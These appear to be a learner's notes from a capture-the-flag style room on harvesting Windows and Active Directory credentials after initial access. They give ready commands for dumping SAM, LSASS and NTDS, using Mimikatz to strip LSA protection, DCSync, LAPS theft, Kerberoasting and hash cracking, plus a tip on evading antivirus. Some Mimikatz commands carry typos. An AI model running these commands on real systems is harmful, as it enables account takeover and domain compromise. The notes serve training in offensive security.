#Windows #CredentialsHarvesting 
## Credentials Harvesting

##### Credentials Harvesting

External credential harvesting includes techniques like phishing to trick the users, while internal credential harvesting uses different approach.

In this room we will look at internal credential harvesting after the attacker gained initial access.
## Credential Access

##### Credential Access

Obtaining legitimate user credentials to access resources such as applications or systems is preferred over using CVEs.

Some insecure locations that store credentials:

- Clear-text files
- Database files
- Memory
- Password managers
- Enterprise Vaults
- Active Directory
- Network Sniffing

##### Clear-text Files

MITRE ATT&CK defines this as [Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/).

Some types of clear-text files that could be useful:

- Command history
- Configuration files
- Other files related to Windows applications
- Backup files
- Shared files and folders
- Registry
- Source code

`C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` - Path for Powershell history file, you can use it to find what users are working on or sensitive information.

`reg query HKLM /f password /t REG_SZ /s` or `reg query HKCU /f password /t REG_SZ /s` - Look for the password keyword in the registry.

##### Database Files

Database files are used by applications to read or write settings, configurations and credentials, database files are usually stored locally on the windows machine.

##### Password Managers

Those applications can have misconfigurations or flaws.

##### Memory Dump

Since memory stores data that belongs to the Windows OS, users and other applications it is only accessible to administrator users.

Some memory stored sensitive data:

- Clear-text credentials
- Cached passwords
- AD tickets

##### Active Directory

AD stores a lot of information related to users groups and computers, it has a solid design but can be misconfigured by admins.

Some AD misconfiguration that can leak users' credentials:

- Users' Description: Administrators set a password in the description.
- Group Policy SYSVOL: Leaked encrypted key let attackers access administrator accounts.
- NTDS: Contains AD users' credentials.
- AD Attacks: AD misconfigurations can make him vulnerable.

## Local Windows Credentials

Local users' details are stored locally on the file system, while domain users' details are stored in a centralized AD.

##### Keystrokes

Keylogger were originally designed for legitimate purposes, but can be misused by attackers.

##### Security Account Manager (SAM)

The SAM database saves local account information such as usernames and passwords in encrypted form, which can not be read when the operating system is running, but there are various ways and attacks to dump its contents.

`C:\Windows\System32\config\sam` - SAM file location.

##### Metasploit's HashDump

We can use the built-in Metasploit feature hashdump, which uses in memory code injection to the LSASS.exe process to dump copy hashes.

`getuid` - From Metasploit confirm you are administrator.
`hashdump` - Dump the hashes.

##### Volume Shadow Copy Service

The Volume Shadow Copy Service helps to perform a volume backup while applications read/write on volumes.

We will be using wmic to create a shadow volume copy, which requires command prompt with administrator privileges.

`wmic shadowcopy call create Volume='C:\'` - Create a copy shadow of C: drive.
`vssadmin list shadows` - Confirm we have a shadow copy of the C: volume.

`c:\Windows\System32\Config\system` - The location for the SAM database decryption key.

`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam` and `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system` - Copy the sam and system files from the shadow copy volume we generated to the desktop.

##### Registry Hives

Windows registry saves some content from the SAM database to be used by Windows services.

`reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg` and `reg save HKLM\system C:\users\Administrator\Desktop\system-reg` - Dump the sam and system files using the registry.

The Impacket SecretsDump scripts extracts credentials from a system locally and remotely using different techniques.

`python3 /opt/impacket/examples/secretsdump.py -sam <sam file location> -system <system file location> LOCAL` - Decrypt the local SAM file, we used the LOCAL argument for this.

To also decrypt AD accounts we need to dump the SECURITY file.
## Local Security Authority Subsystem Service (LSASS)

##### What is the LSASS?

Local Security Authority Server Service (LSASS) is a process that handles the OS security policy and enforces it on a system, it stores credentials so users can access network resources without providing the credentials each time.

If we have administrator privileges we can dump the process memory of LSASS. Windows systems allow us to create a dump file, a snapshot of a given process, either trough GUI or the command prompt. This attack is defined in the MITRE ATT&CK framework as [OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/).

##### Graphic User Interface (GUI)

To dump an running Windows process, go to the Details tab in Task Manager, right click on the required process and select "Create dump file".
##### Sysinternals Suite

We can use ProcDump in the command prompt to dump a process.

`<procdump.exe path> -accepteula -ma lsass.exe <path to dump to>` - Dump the lsass process.

An AV can detect this as malicious, so you might need to write code to encrypt or implement a method to bypass the AV.

##### Mimikatz

LSASS process is running as SYSTEM so we will need SYSTEM or local administrator permissions to access users' hashes.

`mimikatz.exe` - Execute Mimikatz.
`privilege::debug` - Enable the SeDebugPrivilege and check the current permissions for memory access.
`sekurelsa::logonpasswords` - Dump all cached passwords and hashes from lsass.exe.

##### Protected LSASS

In 2012, Microsoft implemented an LSA protection, to keep the LSASS secure from the above attacks, to enable it modify the registry RunAsPPL DWORD value in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa` to 1.

`!+` - Import the mimidrv.sys driver, which works on the kernel level to disable LSA protection to Mimikatz.

If it fails with `isFileExist` error, exit Mimikatz and run it again.

`!processprotect /process lasass.exe /remove` - Disable LSA protection from Mimikatz.

Now we can run the `sekurelsa::logonpasswords` command again.

## Windows Credential Manager

##### What is Credentials Manager

There are 4 credentials categories:

- Web credentials, authentication details stored on browsers or other applications.
- Windows credentials, such as NTLM or Kerberos.
- Generic credentials, contain basic authentication details.
- Certificate-based credentials, Authentication details based on certifications.

Authentication details are stored on the users' folder, but they are cached in the memory.

##### Accessing Credential Manager

We can access the Windows Credential Manager trough GUI (Control Panel -> User Accounts -> Credential Manager) or the command prompt.

`vaultcmd /list` - Use the Windows valltcmd utility to list current Windows vault available.

By default Windows has 2 vaults, one for Web and one for Windows machine credentials.

`vaultcmd /listproperties:"<vault name>"` - Check for credentials in a vault.
`vaultcmd /listcreds:"<vault name>"` - List more information about the stored credentials.

##### Credential Dumping

`powershell -ex bypass` - Execute Powershell with bypass policy.
`Import-Module <Get-WebCredentials.ps1 file location>` - Import the Get-WebCredentials.ps1 script.
`Get-WebCredentials` - Get the username and password.

##### RunAs

The runas is a command line built-in tool that allows us to run applications under different users' permissions, the `/savecred` argument allows us to save the credentials of the user in Windows Credential Manager, so next time we execute as the same user, runas will not ask for a password.

`cmdkey` is a tool used to create, delete and display stored Windows credentials.

`cmdkey /list` - Show all stored credentials.
`runas /savecred /user:<user> cmd.exe` - Start CMD as the specified user.

##### Mimikatz

With Mimikatz you can dump clear-text passwords stored in credential manager from memory.

`sekurlsa::credman` - From Mimikatz dump the credentials from credentials manager.

## Domain Controller

##### NTDS Domain Controller

Net Technology Directory Services (NTDS) is a database containing all AD data, the NTDS.DTS data consists of three tables as follows:

- Schema table: it contains type of objects and their relationships.
- Link table: it contains the object's attributes and their values.
- Data type: it contains users and groups.

NTDS is located in `C:\Windows\NTDS` by default, the file is used by the AD and is locked. Decrypting the NTDS file is requires a system boot key to attempt to decrypt the LSA isolated credentials, so we need to dump the security file containing all required files to decrypt too.

##### Ntdsutil

Ntdsutil is a Windows utility used to manage and maintain AD configurations, it can be used in various scenarios such as:

- Restore deleted objects in AD.
- Perform maintenance for the AD database.
- AD snapshot management.
- Set Directory Services Restore Mode (DSRM) administrator password.

##### Local Dumping (No Credentials)

For this we will need administrator access to the DC, this is usually done if we have no credentials available, we will rely on Windows utilities to dump the NTDS file and crack it offline.

To dump the NTDS file we need the following files:

- C:\Windows\NTDS\ntds.dit
- C:\Windows\System32\config\SYSTEM
- C:\Windows\System32\config\SECURITY

`powershell "<ntdsutil.exe location> 'ac i ntds' 'ifm' 'create full c:\temp' q q"` - Dump the NTDS file in the temp directory.

You should now see in the temp directory 2 folders Active Directory and registry containing the 3 files you need.

`python3 /opt/impacket/examples/secretsdump.py -security <path to SECURITY file> -system <path to SYSTEM file> -ntds <path to ntds.dit file> local` - Extract the hashes from the dumped memory file.

##### Remote Dumping (With Credentials)

To dump a DC and system hashes remotely we will need credentials, we also need credentials for users with administrative access to a DC or special permissions as discussed in the DC Sync section.

##### DC Sync

The DC Sync is a popular attack performed in an AD environment to dump credentials remotely, it works when an account or AD admin account is compromised that has the following permissions:

- Replicating directory changes.
- Replicating directory changes all.
- Replicating directory changes in filtered set.

`python3 /opt/impacket/examples/secretsdump.py -just-dc <domain>/<user>@<ip address>` - Dump NTDS data you can use `-just-dc-ntlm` instead of `-just-dc` to only dump NTLM hashes.
`hashcat -m 1000 -a 0 <path to ntlmhashes file> <path to wordlist>` - Crack ntlm hashes.

## Local Administrator Password Solution (LAPS)

##### Group Policy Preferences (GPP)

Microsoft implemented a method to change password of local Administrator accounts across workstations using GPP.

GPP allows administrators to create domain policies with embedded credentials. Once a GPP is deployed, different XML files are created in the SYSVOL directory, which is an essential component of AD and creates a shared directory on an NTFS volume, that all authenticated domain users can access with reading permissions.

The XML files contained a password encrypted using AES-256, which Microsoft somehow published its private key on [MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), so it's very easy to decrypt the stored passwords with tools such as [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1).

##### Local Administrator Password Solution (LAPS)

In 2015 Microsoft removed the storing passwords in the SYSVOL folder, which introduced LAPS, which offers a much more secure approach for remotely managing the local administrator password.

The new method includes two new attributes of computer objects in the AD. The `ms-mcs-AdmPwd` attribute contains a clear-text password of the local administrator while the `ms-mcs-AdmPwdExpirationTime` contains the expiration time to reset the password. LAPS uses admpwd.dll to change the local administrator password and change the value of `ms-mcs-AdmPwd`.

##### Enumerate for LAPS

`dir "<admpwd.dll directory's path>"` - Check if LAPS is installed by checking the path of the file, usually `C:\Program Files\LAPS\CSE`.
`Get-Command *AdmPwd*` - From Powershell check the available commands for `AdmPwd` cmdlets.
`Find-AdmPwdExtendedRights -Identity *` - Find which AD OU has the "All extended rights" attribute that deals with LAPS, it will output the groups with that attribute.
`net group "<group>"` and `net user <user>` - Check the group and its members.

##### Getting the Password

In order to get the LAPS password we need to compromise or impersonate the found user. After compromising the right user, we can get the LAPS password using `Get-AdmPwdPassword` cmdlet by providing the target machine with LAPS enabled:

`Get-AdmPwdPassword -ComputerName <computer name>`

Most of the time LAPS will only be enabled on specific machines, so you will need to enumerate the right target machine and user, one script to help with that is the [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) Powershell script.

## Other Attacks

##### Kerberoasting

A common AD attack to obtain AD tickets that helps with persistence, for this attack to work the adversary must have access to Service Principle Name (SPN) accounts such as IIS User, MSSQL, etc, the attack involves requesting a TGT and TGS, the end goal is to enable privilege escalation and lateral network movement.

`python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip <ip address of the target> <domain>/<username>` - Find an SPN account.
`python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip <ip address of the target> <domain>/<username> -request-user <found SPN account>` - Request a TGS using the SPN account found.
`hashcat -a 0 -m 13100 <hash file> <wordlist>` - Crack the TGS ticket.
##### AS-REP Roasting

AS-REP Roasting enables the attacker to retrieve password hashes of users whose account options have been set to "Do not require Kerberos pre-authentication", this option relies on the old Kerberos authentication protocol which allowed authentication without a password. If the hash is crackable we can get a password!

For the attack we need a list of domain accounts that should be gathered from the enumeration phase and save the list to a file.

`python3 /opt/impacket/examples/GetNPUsers.py -dc-ip <ip address> <domain>/ -usersfile <users file>` - The tool will generate a ticket once it finds the right user.

##### SMB Relay Attack

This attack abuses the NTLM authentication mechanism (challenge-response protocol). The attacker performs a Man-in-the-Middle attack to monitor and capture SMB packets and extract hashes, SMB signing must be disabled for this.

##### LLMNR/NBNS Poisoning

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) help local network machines to find the right machine if DNS fails, by sending a multicast messages to all network machines.

The LLMNR/NBNS Poisoning occurs when an attacker spoofs authoritative source on the network and responds to the LLMNR and NBNS traffic to the requested host with host identification service.

The goal of the last 2 attacks is to capture NTLM hashes.

## Conclusion

##### Recap

Those tools are worth trying to scan a target machine for hunting sensitive information, suggested for the enumeration phase:

- [Snaffler](https://github.com/SnaffCon/Snaffler)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [Lazagne](https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/)